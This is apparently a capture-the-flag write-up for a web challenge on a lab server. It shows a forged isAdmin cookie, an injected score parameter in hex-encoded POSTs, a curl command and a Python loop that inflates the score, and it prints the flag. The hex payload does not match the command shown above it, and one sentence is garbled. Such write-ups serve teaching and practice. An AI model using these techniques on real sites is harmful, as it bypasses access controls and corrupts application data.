# Web Framework & API Vulnerabilities High Score

Visiting the site at **http://141.85.224.115:7001/**, we found a simple login and registration form. Inspecting the HTML, we discovered that once logged in, we are redirected to /account.php, which allows us to: View our score and user info Submit updated username/email via an AJAX POST request to /api-save-user.php

```js
var data = 'username='+username+'&email='+email;
data = a2hex(data);
$.ajax({
  type: "POST",
  url: "api-save-user.php",
  data: {q: data},
  success: function(data) {
    console.log(data);
  }
});
```

- The data is hex-encoded client-side before being sent.
- No CSRF tokens or validation observed.

We decoded and crafted our own **POST** requests to **api-save-user.php**:
- While inspecting cookies, we noticed a cookie: **isAdmin=false**.
- We manually modified it to: **isAdmin=true**.

And reloaded **/account.php** — it looked visually identical, but we suspected this cookie may unlock some backend functions.

We then tried submitting extra parameters, like a score field:

```bash
username=test&email=test@gmail.com&score=1 {max_score + 1}
```

Encoded and submitted:

```bash
echo -n 'username=test&email=test@gmail.com&score=1' | xxd -p -c 9999

curl -X POST http://141.85.224.115:7001/api-save-user.php \
  -d 'q=757365726e616d653d6461646126656d61696c3d78656e6f776176653140676d61696c2e636f6d2673636f72653d32' \
  -b "PHPSESSID=9bdded797488d3b70c97fe2ca81f57b7; isAdmin=true"
```

It was accepted by the API: **["Success! Your info has been saved!"]**

But the leaderboard did not reflect the updated score only when the cookie was true.. and we got the flag: **SSS{the_greatest_0f_them_all}**

Or our second solution via a python script:
```python
import requests
import codecs
import time

# Configuration
URL = "http://141.85.224.115:7001"
SESSION_ID = "9bdded797488d3b70c97fe2ca81f57b7"
USERNAME = "test"
EMAIL = "test@gmail.com"
TARGET_SCORE = {current highscore + 1 at least}

# Setup session with cookies
session = requests.Session()
session.cookies.set("PHPSESSID", SESSION_ID)
session.cookies.set("isAdmin", "true")

while True:
    print("[*] Getting current highscore from leaderboard...")
    res = session.get(URL + "/leaderboard.php")

    try:
        current_score = int(res.text.split(f"<li>{USERNAME} - ")[1].split(" points")[0])
        print(f"[+] Current highscore: {current_score}")
    except Exception as e:
        print("[-] Could not parse current highscore. Exiting.")
        break

    if current_score >= TARGET_SCORE:
        print(f"[✓] Reached target score ({TARGET_SCORE})!")
        break

    new_score = current_score + 1
    print(f"[*] Updating score to {new_score}...")

    # Build payload
    payload = f"username={USERNAME}&email={EMAIL}&score={new_score}"
    hex_payload = codecs.encode(payload.encode(), "hex").decode()

    res = session.post(URL + "/api-save-user.php", data={"q": hex_payload})

    if "Success" in res.text:
        print(f"[✓] Score updated to {new_score}")
    else:
        print("[-] Failed to update score. Response:", res.text)
        break

    time.sleep(0.05)
```
